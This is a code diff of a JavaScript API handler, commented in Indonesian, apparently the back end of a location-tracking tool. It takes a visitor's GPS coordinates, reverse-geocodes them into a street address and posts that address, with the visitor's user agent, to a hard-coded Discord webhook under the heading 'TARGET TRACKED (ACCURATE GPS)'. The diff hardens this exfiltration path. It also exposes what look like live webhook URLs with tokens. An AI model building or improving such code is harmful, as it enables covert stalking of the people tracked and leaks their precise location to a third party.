@@ -1,18 +1,32 @@
 export default async function handler(req, res) {
     if (req.method === 'POST') {
-        const { lat, lon } = req.body;
-        const clientIp = req.headers['x-forwarded-for'] || 'Unknown';
-        const userAgent = req.headers['user-agent'] || 'Unknown';
-
         try {
-            // Gunakan reverse geocoding gratis untuk mendeteksi nama kota dari koordinat GPS
-            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            // 1. Tangani body agar aman dibaca (parse jika masih berupa string/buffer)
+            let bodyData = req.body;
+            if (typeof bodyData === 'string') {
+                bodyData = JSON.parse(bodyData);
+            }
+            
+            const { lat, lon } = bodyData || {};
+            const userAgent = req.headers['user-agent'] || 'Unknown';
+
+            if (!lat || !lon) {
+                return res.status(400).json({ error: 'Koordinat tidak ditemukan' });
+            }
+
+            // 2. Ambil nama alamat menggunakan Nominatim dengan menyertakan User-Agent khusus
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`, {
+                headers: {
+                    'User-Agent': 'IP-Tracker-App/1.0 (contact@example.com)'
+                }
+            });
             const geoData = await geoRes.json();
             const address = geoData.display_name || 'Tidak diketahui';
 
-            const discordWebhookUrl = "https://discord.com/api/webhooks/1563198219284906116/bTgAtzBPWpJ3T8laDTu-SUC0pppBkUV7ceFDUHedGpo74toylxKkkwFCKPk6czvT8HXA"; // Ganti dengan Webhook Discord Anda
+            // 3. Webhook Discord Anda
+            const discordWebhookUrl = "https://discord.com/api/webhooks/1563198219284906116/bTgAtzBPWpJ3T8laDTu-SUC0pppBkUV7ceFDUHedGpo74toylxKkkwFCKPk6czvT8HXA";
 
-            if (discordWebhookUrl && discordWebhookUrl !== "https://discord.com/api/webhooks/1563194910998401186/0Wff6MGmOXYNdFBs4iD9cupVq_xZCzDUPZaFyJKp2Cy7QkLAlv1uQvcpoK5nvYaPVA-1") {
+            if (discordWebhookUrl) {
                 const message = {
                     content: `🎯 **TARGET TERLACAK (GPS AKURAT)!** 🎯\n` +
                              `📍 **Alamat:** ${address}\n` +
@@ -26,11 +40,14 @@ export default async function handler(req, res) {
                     body: JSON.stringify(message)
                 });
             }
+
+            return res.status(200).json({ success: true });
         } catch (error) {
             console.error("Gagal memproses lokasi:", error);
+            return res.status(500).json({ error: error.message });
         }
-
-        return res.status(200).json({ success: true });
     }
-    res.status(405).json({ error: 'Method not allowed' });
+    
+    res.setHeader('Allow', ['POST']);
+    res.status(405).json({ error: `Method ${req.method} Not Allowed` });
 }
